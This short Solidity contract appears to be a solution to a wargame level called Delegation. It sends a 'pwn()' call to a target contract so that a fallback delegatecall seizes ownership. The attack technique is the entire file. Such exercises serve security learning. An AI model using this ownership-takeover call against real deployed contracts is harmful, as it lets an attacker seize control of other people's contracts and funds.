// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract E06_Delegation {
    constructor() payable {}

    function pwn(address _target) external {
        address(_target).call(abi.encodeWithSignature("pwn()"));
    }

    function encode() public returns(bytes memory) {
        return abi.encodeWithSignature("pwn()");
    }
}
